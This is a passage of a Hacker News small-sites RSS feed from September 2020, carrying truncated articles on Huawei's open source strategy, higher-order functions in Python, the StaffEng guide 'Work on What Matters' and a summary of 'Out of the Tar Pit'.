I‚Äôve written in ‚Äú<a href="https://interconnected.blog/covid-open-source-industrial-policy/"><strong>COVID, Open Source, Industrial Policy</strong></a>‚Äù, a foundation‚Äôs involvement can help open source technologies in two meaningful ways: <strong>accelerate development and vendor neutrality.</strong> In a nutshell, vendor neutrality is important because it allows other large companies to contribute in the development of an open source technology without fearing vendor lock-in by another company, thus leads to faster development of that technology. An example would be Kuberentes, an open source container orchestration software that was first created by Google but is now the anchor project for the <a href="https://www.cncf.io/">Cloud Native Computing Foundation</a> (CNCF); Kubernetes‚Äôs <a href="https://www.zdnet.com/article/kubernetes-and-containers-are-growing-up-fast-survey-shows/">fast growth</a> would not be possible if it still resides within Google.</p><p>While a foundation‚Äôs involvement is by no means necessary -- and many open source projects have become popular without a foundation‚Äôs support -- it does help. <strong>And that‚Äôs what the OpenAtom Foundation is trying to deliver for China‚Äôs technology ecosystem. </strong>Its model and value proposition is similar to that of the Linux Foundation: basically <strong>delivering foundation (thus neutrality) as a service</strong> to open source projects, including legal, IP trademark management, licensing, community building, joint marketing, etc.</p><p>An open source foundation is successful when it builds an ecosystem of technologies around the anchor project with a coherent theme. The Linux Foundation, of course, built an ecosystem around Linux with many ancillary and adjacent technologies around the ‚Äúopen source operating system‚Äù theme. &nbsp;The CNCF (a subsidiary foundation of the Linux Foundation) <a href="https://github.com/cncf/landscape/blob/master/README.md#trail-map">built an ecosystem</a> of technologies around Kubernetes and the ‚Äúcloud-native‚Äù theme.</p><p>While the OpenAtom Foundation is <a href="https://www.openatom.org/#/projectList">already hosting seven projects</a> as part of its launch, with a lofty goal of fostering open source software, hardware, semiconductors, and content (I‚Äôm assuming documentation and technical education), the only theme seems to be that all projects were created by Chinese companies. And besides OpenHarmony, whose strategic value to Huawei is clear, the other technologies seem trivial to their original creators:</p><ul><li><strong>Xuperchain</strong>, a blockchain infrastructure project from <strong>Baidu</strong></li><li><strong>TKEStack</strong> (a container orchestration layer based on Kubernetes) and <strong>TencentOS</strong> (an energy-efficient IoT operating system) from <strong>Tencent</strong></li><li><strong>AliOS</strong> (a light-weight IoT operating system) from <strong>Alibaba</strong></li><li><strong>PIKA</strong> (a storage system based on the open source database, Redis) from <strong>Qihoo360</strong></li><li><strong>UBML</strong> (a Unified Business Modeling Language modeling system) from <strong>Netease</strong><br></li></ul><figure><img src="https://lh4.googleusercontent.com/73XjJgCZnhJYxnCW4L8XjLFa9FHQbxAz7nYWTWmaGAsUVSW-L7TH7BurSGCj-H1sc2PnemuL2tuzm16EM7vxtBs8ydPAhQSHCHnsMidVpguJhBaU6hVavLasls45i76RPVNyGFbZ" alt=""></figure><p>If I have to surmise a future theme that is technology-focused and not nationality-focused, it would be IoT because when OpenHarmony was first unveiled in 2019 (as HarmonyOS), it was an IoT-focused operating system, like TencentOS and AliOS. But since then, its scope has broadened to include support for smartphones, watches, and smart TVs.</p><p>One other curious element about OpenAtom is that <strong>only two projects</strong> (OpenHarmony, TencentOS) are hosted on the ‚Äúnational champion‚Äù, <strong>Gitee</strong>, while <strong>four others</strong> (AliOS, PIKA, Xuperchain, TKE) are on <strong>GitHub</strong>. The remaining one, UBML from Netease, requires a developer to fill out a form to apply for access, which is a very developer-<em><strong>un</strong></em>friendly way to run an open source project.</p><h2 id="technology-foundation-developer-approval">Technology + Foundation = Developer Approval?</h2><p>That‚Äôs the hope anyway. The nirvana of an open source technology, with or without a foundation, is to achieve widespread participation and buy-in among developers, who will both make use of the technology at scale and contribute to its development. And if an <em>experienced</em> foundation gets involved to leverage its best practices in open source management, it can increase the success rate by reducing much of the messiness and common mistakes that often plague young open source projects.</p><p>In the case of Huawei though, <strong>OpenHarmony is a young project, and OpenAtom is an even younger foundation.</strong></p><p>The lazy and obvious conclusion here is to just dismiss all these efforts as a fool‚Äôs errand. <strong>But that‚Äôs not what you came to Interconnected for. </strong>The honest and nuanced conclusion is: <strong>it‚Äôs too early to tell and there are trends working both against and for Huawei‚Äôs open source strategy.</strong></p><h3 id="factors-against">Factors Against</h3><p>Huawei is infamous for its secretive ownership structure. Nobody knows exactly who or what owns Huawei. It‚Äôs a private Chinese LLC. It‚Äôs employee-owned, with 98.99% of company shares controlled by its employees via a ‚Äútrade union committee‚Äù. Allegedly, this committee pays dues to more senior trade unions in an opaque bureaucracy that ultimately leads to the All-China Federation of Trade Unions, which is controlled by the Chinese Communist Party (thus all the controversy). That‚Äôs why <a href="https://interconnected.blog/why-huawei-should-ipo-in-america/">I‚Äôve advocated for Huawei to IPO in New York</a> -- a bold act that would bring some desperately-needed credibility to the company.</p><p>Along the same vein, the OpenAtom Foundation also needs transparent, credible governance of its projects <em>and itself</em>. It currently boasts a 16-member Technical Oversight Committee (TOC), a typical governing element of an open source foundation, with Chinese technologists who have had years of experience working on projects in the Apache Software Foundation and Mozilla Foundation -- a good start. Their decision making process will have to be public and transparent to earn credibility from the wide developer community, both within and outside of China. As a reference, the <a href="https://github.com/cncf/toc/">CNCF TOC‚Äôs every governing deliberation</a> is viewable and commentable on GitHub. Because OpenAtom is, after all, a China-registered entity, to what degree it can deliver pure transparency is questionable.</p><p>Lastly, OpenHarmony‚Äôs birthright as a Chinese creation makes building neutrality and credibility harder than just about any other birthright on the planet. <strong>This is an obvious yet important point that every Chinese company is struggling with right now. It is an element that every Chinese immigrant living abroad has been struggling with for much longer. </strong>For a young project, OpenHarmony does have reasonably good documentation in both English and Chinese -- an important first step that must be continued for the long haul. Maintaining a bilingual presence (much like this blog) requires lots of extra hard work -- work that an American-born, German-born, or French-born project does not have to do. <strong>None of us can pick where we are born, but we all have to deal with its uneven consequences. There is no point in pretending that doesn‚Äôt exist.</strong></p><h3 id="factors-for">Factors For</h3><p>It‚Äôs not all doom and gloom for Huawei; there are a couple of factors potentially working in its favor. For one, the U.S.‚Äôs own credibility and neutrality when regulating cross-border technology businesses is also deteriorating. The Trump administration‚Äôs wheeling and dealing of TikTok is nothing short of cronyism, so much so that it has been called out by <a href="https://www.wsj.com/articles/trump-tiktok-and-crony-capitalism-11600639766?mod=hp_opin_pos_2">none other than the WSJ editorial board</a>. Although this doesn‚Äôt mean Huawei will have an opening to re-enter the U.S. market, other parts of the world may be more receptive to its technology. Regions like Southeast Asia, Latin America, the Middle East, and Africa are all credible possibilities. (See more in ‚Äú<a href="https://interconnected.blog/where-can-the-chinese-internet-go/"><strong>Where Can the Chinese ‚Ä¶</strong></a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/300-years-huawei-open-source-strategy/">https://interconnected.blog/300-years-huawei-open-source-strategy/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/300-years-huawei-open-source-strategy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582314</guid>
            <pubDate>Thu, 24 Sep 2020 19:06:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Systems Software Research is Irrelevant (2000) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582279">thread link</a>) | @ra7
<br/>
September 24, 2020 | http://herpolhode.com/rob/utah2000.pdf | <a href="https://web.archive.org/web/*/http://herpolhode.com/rob/utah2000.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://herpolhode.com/rob/utah2000.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582279</guid>
            <pubDate>Thu, 24 Sep 2020 19:03:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Higher Order Functions in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582199">thread link</a>) | @renanmoura
<br/>
September 24, 2020 | https://renanmf.com/higher-order-functions-in-python/ | <a href="https://web.archive.org/web/*/https://renanmf.com/higher-order-functions-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Also known as first-class functions, functions can take other functions as parameters and also return other functions.</p>
<p>Since everything in Python is an object, we can treat functions as such.</p>
<p>Say you have a list of car brands that is totally messy and you want to normalize them.</p>
<p>The task is for all of them to be lower case, no extra spaces at the beginning or end of each brand name.</p>
<p>One way to do that is to use the special functions built-in Python to handle strings.</p>
<p><code>strip()</code> will remove the extra spaces, <code>lower()</code> will convert all the characters into lower case</p>
<p>We are going to define a function that takes a list, iterates over the values, and applies the cleaning to each of them.</p>
<p>Then we take each new normalized value and add it to a new list <code>normalized_brands</code> that will be returned as a result of our function execution.</p>
<pre><code>car_brands = ['BMW ', 'Ferrari', 'McLareN', ' TOyota', '   Ford   ']

def normalize_brands(brand_list):
     normalized_brands = []
     for brand in brand_list:
             brand = brand.strip()
             brand = brand.lower()
             normalized_brands.append(brand)
     return normalized_brands

car_brands_normalized = normalize_brands(car_brands)

print(car_brands_normalized)</code></pre>
<pre><code>['bmw', 'ferrari', 'mclaren', 'toyota', 'ford']</code></pre>
<p>It works as expected, but this function is very useful and could be refactored to be more generalist.</p>
<p>Functions can also be treated as objects, meaning we can have things like a list of functions!</p>
<p>Then we can iterate over them and apply the values in a more dynamic fashion, let‚Äôs see that in action to make it more clear.</p>
<pre><code>car_brands = ['BMW ', 'Ferrari', 'McLareN', ' TOyota', '   Ford   ']

normalization_functions = [str.strip, str.lower]

def normalize_strings(string_list, functions):
     normalized_strings = []
     for item in string_list:
             for func in functions:
                     item = func(item)
             normalized_strings.append(item)
     return normalized_strings

normalized_brands = normalize_strings(car_brands, normalization_functions)

print(normalized_brands)</code></pre>
<pre><code>['bmw', 'ferrari', 'mclaren', 'toyota', 'ford']</code></pre>
<p>We have a list of strings as before, but now we also have a list of functions.</p>
<p>Our function <code>normalize_strings</code> now expects both lists, the strings, and the functions list.</p>
<p>We create a new empty list to store our normalized strings.</p>
<p>Then the first <code>for</code> loop goes through each item in <code>string_list</code> and the second <code>for</code> loop goes through each item in <code>functions</code>.</p>
<p>Then we apply each <code>func</code> to each <code>item</code> by calling <code>item = func(item)</code>.</p>
<p>Then we add the new normalized item to our new list and when it finishes, we return <code>normalized_strings</code>.</p>
<p>This way we can increase <code>normalization_functions</code> to have as many functions as we need and reuse <code>normalize_strings(string_list, functions)</code> in many other situations.</p>
</div></div>]]>
            </description>
            <link>https://renanmf.com/higher-order-functions-in-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582199</guid>
            <pubDate>Thu, 24 Sep 2020 18:56:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self Promotion: How to Sell Yourself]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582151">thread link</a>) | @IncRnd
<br/>
September 24, 2020 | https://www.coachingforchange.com/pub06.html | <a href="https://web.archive.org/web/*/https://www.coachingforchange.com/pub06.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.coachingforchange.com/pub06.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582151</guid>
            <pubDate>Thu, 24 Sep 2020 18:52:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Work on What Matters]]>
            </title>
            <description>
<![CDATA[
Score 395 | Comments 95 (<a href="https://news.ycombinator.com/item?id=24581810">thread link</a>) | @wholien
<br/>
September 24, 2020 | https://staffeng.com/guides/work-on-what-matters | <a href="https://web.archive.org/web/*/https://staffeng.com/guides/work-on-what-matters">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><h4><a href="https://staffeng.com/guides">Guides</a> / <a href="https://staffeng.com/guides/work-on-what-matters">Work on what matters</a></h4><div><p>We all have a finite amount of time to live, and within that mortal countdown we devote some fraction towards our work. Even for the most career-focused, your life will be filled by many things beyond work: supporting your family, children, exercise, being a mentor and a mentee, hobbies, and so the list goes on. This is the sign of a rich life, but one side-effect is that time to do your work will become increasingly scarce as you get deeper into your career.</p>
<p>If you‚Äôre continuing to advance in your career, then even as your time available for work shrinks, the expectations around your impact will keep growing. For a while you can try sleeping less or depriving yourself of the non-work activities you need to feel whole, but you‚Äôll inevitably find that your work maintains an aloof indifference to your sacrifice rather than rewarding it. Only through <a href="https://lethain.com/forty-year-career/">pacing your career to your life</a> can you sustain yourself for the long-term.</p>
<p>Indeed, pacing yourself becomes the central challenge of a sustained, successful career: increasingly senior roles require that you accomplish more and more, and do it in less and less time. The ledge between these two constraints gets narrower the further you go, but it remains walkable if you take a deliberate approach.</p>
<p>First a discussion on a few common ways to get tripped up: <em>snacking</em>, <em>preening</em>, and <em>chasing ghosts</em>. Then we‚Äôll get into the good stuff: how <em>do</em> you work on what really matters?</p>
<h2>Avoid snacking</h2>
<p>Hunter Walk recommends that folks <a href="https://hunterwalk.com/2016/06/18/the-best-startups-resists-snacks-im-not-talking-about-food/">avoid ‚Äúsnacking‚Äù</a> when they prioritize work. If you‚Äôre in a well-run organization, at some point you‚Äôre going to run out of things that are both high-impact and easy. This leaves you with a choice between shifting right to hard and high-impact or shifting down to easy and low-impact. The latter choice--easy and low-impact--is what Walk refers to as <em>snacking</em>.</p>
<p>When you‚Äôre busy, these snacks give a sense of accomplishment that makes them psychologically rewarding but you‚Äôre unlikely to learn much from doing them, others are likely equally capable of completing them (<em>and</em> for some of them it might be a good development opportunity), and there‚Äôs a tremendous opportunity cost versus doing something higher impact.</p>
<p>It‚Äôs ok to spend some of your time on snacks to keep yourself motivated between bigger accomplishments, but you have to keep yourself honest about how much time you‚Äôre spending on high-impact work versus low-impact work. In senior roles, you‚Äôre more likely to self-determine your work and if you‚Äôre not deliberately tracking your work, it‚Äôs easy to catch yourself doing little to no high-impact work.</p>
<h2>Stop preening</h2>
<p>Where ‚Äúsnacking‚Äù is the broad category of doing easy and low-impact work, there‚Äôs a particularly seductive subset of snacking that I call ‚Äúpreening.‚Äù Preening is doing low-impact, high-visibility work. Many companies conflate high-visibility and high-impact so strongly that they can‚Äôt distinguish between preening and impact, which is why it‚Äôs not uncommon to see some companies‚Äô senior-most engineers spend the majority of their time doing work of dubious value but that is frequently recognized in company meetings.</p>
<p>If you‚Äôre taking a short-term look at <a href="https://yenkel.dev/posts/how-to-achieve-career-growth-opportunities-skills-sponsors">career growth</a>, then optimizing for your current organization‚Äôs pathologies in evaluating impact is the optimal path: go forth and preen gloriously. However, if you‚Äôre thinking about developing yourself to succeed as your <a href="https://lethain.com/growing-with-your-company/">current role grows in complexity</a> or across multiple organizations, then it‚Äôs far more important to strike a balance between valued work and self-growth.</p>
<p>This is also an important factor to consider when choosing a company to work at! Dig into what a company values and ensure it aligns with your intended personal growth. If a company‚Äôs leadership is entirely folks who focus their energy on performant urgency or acts of fealty, don‚Äôt be surprised when your success in the company depends on those activities.</p>
<p>Worse, to be a successful preener requires a near invulnerability to criticism of your actual impact, and your true work <em>will</em> suffer if your energy is diverted to preening. Typically this means you need to be a vanity hire of a senior leader or to present yourself in the way a company believes leaders look and act. If that isn‚Äôt you, then your attempt to exchange your good judgement for company success will end up failing anyway: you‚Äôll get held accountable for the lack of true impact where others who match the company‚Äôs expectation of how a leader appears will somehow slip upward.</p>
<h2>Stop chasing ghosts</h2>
<p>Many folks would assume that companies, rational optimizers that they are, avoid spending much time on low-impact high-effort projects. Unfortunately that isn‚Äôt consistently the case. It‚Äôs surprisingly common for a new senior leader to join a company and immediately drive <a href="https://lethain.com/grand-migration/">a strategy shift that fundamentally misunderstands the challenges at hand</a>. The ghosts of their previous situation hold such a firm grasp on their understanding of the new company that they misjudge the familiar as the essential.</p>
<p>As a senior leader, you have to maintain a hold on your ego to avoid investing into meaningless work at a grand scale. This can be surprisingly challenging when during your hiring process you‚Äôve been repeatedly told that you‚Äôve been hired to fix something deeply broken -- you‚Äôre the newly-hired savior, of course your instincts are right! Taking the time to understand the status quo before shifting it will always repay diligence with results.</p>
<p>I had a recent discussion with someone who argued that new senior leaders <em>deliberately</em> push for major changes even though they suspect the efforts will fail. Such changes make the organization increasingly dependent on the new leader, and also ensures anything that <em>does</em> go well gets attributed to the new leader directly rather than their team. If this is your approach to leadership, please know that you‚Äôre awful and take the time to work on yourself until the well-being and success of an entire company matters to you more than being perceived as essential.</p>
<h2>Existential issues</h2>
<p>Now that you‚Äôre done snacking, preening and chasing ghosts, the first place to look for work that matters is exploring whether your company is experiencing an existential risk. Companies operate in an eternal <a href="https://lethain.com/iterative-elimination-tournaments/">iterative elimination tournament</a>, balancing future success against surviving until that future becomes the present. If you‚Äôre about to lose one of those rounds, then always focus there.</p>
<p>Running out of money, <a href="https://lethain.com/digg-v4/">like my experience at Digg</a>, can be the most obvious issue, but not every existential issue is financial, like <a href="https://www.theatlantic.com/technology/archive/2015/01/the-story-behind-twitters-fail-whale/384313/">Twitter‚Äôs fail whale stability challenges</a> or adapting to the shifts caused by the Covid-19 pandemic.</p>
<p>If something dire is happening at your company, then that‚Äôs the place to be engaged. Nothing else will matter if it doesn‚Äôt get addressed.</p>
<h2>Work where there‚Äôs room <em>and</em> attention</h2>
<p>Existential issues are usually <em>not</em> the most efficient place to add your efforts, but efficiency isn‚Äôt a priority when the walls are crashing down around you. You <em>should</em> swarm to existential problems, but if a problem isn‚Äôt existential then you should be skeptical of adding your efforts where everyone‚Äôs already focused. Folks often chase leadership‚Äôs top priority, but with so many folks looking to make their impact there, it‚Äôs often challenging to have a meaningful impact.</p>
<p>Instead, the most effective places to work are those that matter to your company but still have enough room to actually do work. What are priorities that will become critical in the future, where you can do great work ahead of time? Where are areas that are doing <em>ok</em> but could be doing <em>great</em> with your support?</p>
<p>Sometimes you‚Äôll find work that‚Äôs <em>worthy</em> of attention, but which an organization is incapable of paying attention to, usually because its leadership doesn‚Äôt value that work. In some companies this is developer tooling work, in others it‚Äôs inclusion work, and in most companies it‚Äôs <a href="https://noidea.dog/glue">glue work</a>.</p>
<p>There is almost always a great deal of room to do this sort of work that no one is paying attention to, so you‚Äôll be able to make rapid initial progress on it, which <em>feels</em> like a good opportunity to invest. At some point, though, you‚Äôll find that the work needs support, and it‚Äôs quite challenging to get support for work that a company is built to ignore or devalue. Your early wins will slowly get eroded by indifference and misalignment, and your initial impact will be reclaimed by the sands of time.</p>
<p>Does this mean you shouldn‚Äôt do inclusion work? No, that‚Äôs not the conclusion I want you to take away from this. Sometimes an area that an organization doesn‚Äôt pay attention to is so important that you‚Äôre going to want to advocate for it to start paying attention. Teaching a company to value something it doesn‚Äôt care about is considerably the hardest sort of work you can do, and it often fails, so you should do as little of it as you can, but no less. As a senior leader, you have an ethical obligation that goes beyond maximizing your company-perceived impact, but it‚Äôs important to recognize what you‚Äôre up against and time your efforts accordingly.</p>
<h2>Foster growth</h2>
<p>One area that‚Äôs often underinvested in (e.g. lots of room to work in) while also being highly leveraged is growing the team around you. <em>Hiring</em> has a lot of folks involved in it, usually in terms of optimizing the <a href="https://lethain.com/hiring-funnel/">hiring funnel</a>, but onboarding, mentoring and coaching are wholly neglected at many companies despite being <em>at least</em> <a href="https://lethain.com/productivity-in-the-age-of-hypergrowth/">as impactful as hiring to your company‚Äôs engineering velocity</a>.</p>
<p>If you start dedicating even a couple hours a week to developing the team around you, it‚Äôs quite likely that will become your legacy long after your tech specs and pull requests are forgotten.</p>
<h2>Edit</h2>
<p>A surprising number of projects are one small change away from succeeding, one quick modification that unlocks a new opportunity, or one conversation away from consensus. I think of making those small changes, quick modifications and short conversations as <em>editing</em> your team‚Äôs ‚Ä¶</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://staffeng.com/guides/work-on-what-matters">https://staffeng.com/guides/work-on-what-matters</a></em></p>]]>
            </description>
            <link>https://staffeng.com/guides/work-on-what-matters</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581810</guid>
            <pubDate>Thu, 24 Sep 2020 18:26:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacker News for ML]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581619">thread link</a>) | @DTE
<br/>
September 24, 2020 | https://mln.dev/top/1 | <a href="https://web.archive.org/web/*/https://mln.dev/top/1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://mln.dev/top/1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581619</guid>
            <pubDate>Thu, 24 Sep 2020 18:11:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Out of the Tar Pit: A Summary]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581591">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/ | <a href="https://web.archive.org/web/*/http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody text">
    <div>
<p><a href="http://curtclifton.net/papers/MoseleyMarks06a.pdf">Out of the Tar Pit</a> is a 2006 paper by Ben Moseley and Peter Marks about the causes and effects
of complexity in software systems. The thesis of the paper is stated already in the second sentence
of the paper:</p>
<blockquote>
The biggest problem in the development and maintenance of large-scale software systems is
complexity ‚Äî large systems are hard to understand.</blockquote>
<p>As implied by the authors, complexity is a property of a software system that represents the degree
of difficulty that is experienced when trying to understand the system. State‚Äîin particular mutable
state‚Äîis the primary cause of complexity. Additional causes are code volume and control flow, but
these are of secondary importance.</p>
<div id="complexity">
<h2>Complexity</h2>
<p>Of the four properties described by Brooks in the paper entitled <a href="https://en.wikipedia.org/wiki/No_Silver_Bullet">No Silver Bullet</a> that make
building software hard (complexity, conformity, changeability, invisibility), the authors state
that complexity is the only meaningful one:</p>
<blockquote>
Complexity is the root cause of the vast majority of problems with software today. Unreliability,
late delivery, lack of security ‚Äî often even poor performance in large-scale systems can all be
seen as deriving ultimately from unmanageable complexity.</blockquote>
<p>By complexity, the authors mean "that which makes large systems <em>hard to understand</em>," not the
field of computer science that is concerned with the resources that are consumed by an algorithm.</p>
</div>
<div id="approaches-to-understanding">
<h2>Approaches to Understanding</h2>
<p>To better establish their definition of complexity, the authors explore the ways in which
developers attempt to understand a system. There are two main ways:</p>
<ol>
<li>
<strong>Testing</strong> This is a way to understand the system from the outside.</li>
<li>
<strong>Informal Reasoning</strong> This is a way to understand the system from the inside.</li>
</ol>
<blockquote>
Of the two, informal reasoning is the most important by far. This is because ‚Äî as we shall see
below ‚Äî there are inherent limits to what can be achieved by testing, and because informal
reasoning (by virtue of being an inherent part of the development process) is always used.  The
other justification is that improvements in informal reasoning will lead to less errors being
created whilst all that improvements in testing can do is to lead to more errors being detected.</blockquote>
<p>The primary problem with testing is that a test will only tell you about the behavior of a system
subject to the particular range of inputs used by the test. A test will tell you absolutely nothing
about the system's behavior under a different set of inputs. In large systems, the set of all
possible inputs is too large to fully explore with testing.</p>
<blockquote>
Have you performed the right tests? The only certain answer you will ever get to this question is
an answer in the negative ‚Äî when the system breaks.</blockquote>
<p>Informal reasoning, on the other hand, is what is used when a developer builds a mental model about
how the system works while looking at the code. Because it is the most important way to understand
a system, simplicity is a vital characteristic of well-functioning, large-scale systems.</p>
</div>
<div id="causes-of-complexity">
<h2>Causes of Complexity</h2>
<div id="state">
<h3>State</h3>
<p>The presence of state (particularly mutable state) makes programs difficult to understand. The
authors offer the following example to explain the problems of state:</p>
<blockquote>
Anyone who has ever telephoned a support desk for a software system and been told to ‚Äútry it
again‚Äù, or ‚Äúreload the document‚Äù, or ‚Äúrestart the program‚Äù, or ‚Äúreboot your computer‚Äù or
‚Äúre-install the program‚Äù or even ‚Äúre-install the operating system and then the program‚Äù has
direct experience of the problems that state causes for writing reliable, understandable
software.</blockquote>
<p>State makes testing difficult by making flakiness more likely. (Flakiness describes a set of tests
that randomly fail for seemingly no reason.) This fact, combined with the large number of inputs to
a program, combine together <em>horribly</em> (emphasis the authors).</p>
<p>In addition, state complicates informal reasoning by hindering the developer from understanding the
system "from the inside." It contaminates a system in the sense that even mostly stateless systems
become difficult to understand when coupled to components with mutable state.</p>
</div>
<div id="control">
<h3>Control</h3>
<p>The authors claim that the next most important barrier to understanding is control.</p>
<blockquote>
Control is basically about the order in which things happen. The problem with control is that
very often we do not want to have to be concerned with this.</blockquote>
<p>Complexity caused by control very much depends on the choice of language; some languages make
control flow explicit, whereas other, more declarative languages, make control flow
implicit. Having to explicitly deal with control creates complexity.</p>
<p>The same is true of concurrency. Explicit concurrency in particular makes both testing and informal
reasoning about programs hard.</p>
</div>
<div id="code-volume">
<h3>Code volume</h3>
<p>Increasing the amount of code does increase complexity, but effective management of state and
control marginalizes its impact.</p>
<p>There are indeed other causes of complexity than the three listed above, but they all reduce to
three basic principles:</p>
<ol>
<li>Complexity breeds complexity</li>
<li>Simplicity is <em>hard</em>
</li>
<li>Power corrupts</li>
</ol>
<p>The last principle states that mistakes and poor decisions <em>will be made</em> when a language allows
it. For this reason, restrictive, declarative languages and tools should be preferred.</p>
</div>
</div>
<div id="classical-approaches-to-managing-complexity">
<h2>Classical approaches to managing complexity</h2>
<p>To better understand the ways in which programmers manage complexity, the authors explore three
major styles of programming:</p>
<ol>
<li>Imperative (more precisely, object-oriented)</li>
<li>Functional</li>
<li>Logic</li>
</ol>
<div id="object-orientation">
<h3>Object-orientation</h3>
<p>Object-oriented programming (OOP) is one of the most dominant styles of programming today for
computers that are based on the von Neumann architecture and is presumably inspired largely by its
state-based form of computation.</p>
<p>OOP enforces integrity constraints on data by combining an object's state with a set of procedures
to access and modify it. This characteristic is known as <em>encapsulation</em>. Problems may arise when
multiple procedures contend for access to the same state.</p>
<p>OOP also views objects as being uniquely identifiable, regardless of the object's attributes. In
other words, two objects with the exact same set of attributes and values are condsidered
distinct. This property is known as <em>intensional identity</em> and contrasts with <em>extensional
identity</em> in which things are considered the same if their attributes are the same.</p>
<p>For these two reasons, OOP is not suitable for avoiding the problems of complexity:</p>
<blockquote>
The bottom line is that all forms of OOP rely on state (contained within objects) and in general
all behaviour is affected by this state. As a result of this, OOP suffers directly from the
problems associated with state described above, and as such we believe that it does not provide
an adequate foundation for avoiding complexity.</blockquote>
</div>
<div id="functional-programming">
<h3>Functional programming</h3>
<p>Modern functional programming (FP) languages can be classified as pure (e.g. Haskell) and impure
(e.g. the ML family of languages).</p>
<blockquote>
<p>The primary strength of functional programming is that by avoiding state (and side-effects) the
entire system gains the property of <em>referential transparency</em> - which implies that when supplied
with a given set of arguments a function will always return exactly the same result (speaking
loosely we could say that it will always behave in the same way)...</p>
<p>It is this cast iron guarantee of <em>referential transparency</em> that obliterates one of the two
crucial weaknesses of testing as discussed above. As a result, even though the other weakness of
testing remains (testing for one set of inputs says nothing at all about behaviour with another
set of inputs), testing does become far more effective if a system has been developed in a
functional style.</p>
</blockquote>
<p>Informal reasoning is also more effective in the functional approach to programming. By enforcing
<em>referential transparency</em>, mutable state is generally avoided. However, in spite of its
properties, nothing in FP can prevent somenone from effectively simulating multiple state, so some
care must still be taken.</p>
<p>The authors concede that by sacrificing state in FP, one does lose a degree of modularity.</p>
<blockquote>
Working within a stateful framework it is possible to add state to any component without
adjusting the components which invoke it. Working within a functional framework the same effect
can only be achieved by adjusting every single component that invokes it to carry the additional
information around.</blockquote>
<p>However,</p>
<blockquote>
The trade-off is between complexity (with the ability to take a shortcut when making some
specific types of change) and simplicity (with huge improvements in both testing and
reasoning). As with the discipline of (static) typing, it is trading a one-off up-front cost for
continuing future gains and safety (‚Äúone-off‚Äù because each piece of code is written once but is
read, reasoned about and tested on a continuing basis).</blockquote>
<p>FP remains relatively unpopular despite its advantages. The authors state that the reason is that
problems arise when programmers attempt to use it in problems that require mutable state.</p>
</div>
<div id="logic-programming">
<h3>Logic programming</h3>
<p>Logic programming is like FP in the sense that it is declarative: it emphasizes what needs to be
done, not how it is done. The primary example of a logic programming language is Prolog.</p>
<blockquote>
Pure logic programming is the approach of doing nothing more than making statements about the
problem (and desired solutions). This is done by stating a set of axioms which describe the
problem and the attributes required of something for it to be considered a solution. The ideal of
logic programming is that there should be an infrastructure which can take the raw axioms and use
them to find or check solutions. All solutions are formal logical consequences of the axioms
supplied, and ‚Äúrunning‚Äù the system is equivalent to the construction of a formal proof of each
solution.</blockquote>
<p>Pure logic programming does not suffer from the same problems of state and control as OOP. However,
it appears that real logic programming languages need to make some pragmatic tradeoffs in their
implementations which introducs small amounts of state and ‚Ä¶</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/">http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/</a></em></p>]]>
            </description>
            <link>http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581591</guid>
            <pubDate>Thu, 24 Sep 2020 18:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Programming with Categories (Online Book Draft) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581521">thread link</a>) | @909832
<br/>
September 24, 2020 | http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf | <a href="https://web.archive.org/web/*/http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581521</guid>
            <pubDate>Thu, 24 Sep 2020 18:04:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The failed promise of Web Components]]>
            </title>
            <description>
<![CDATA[
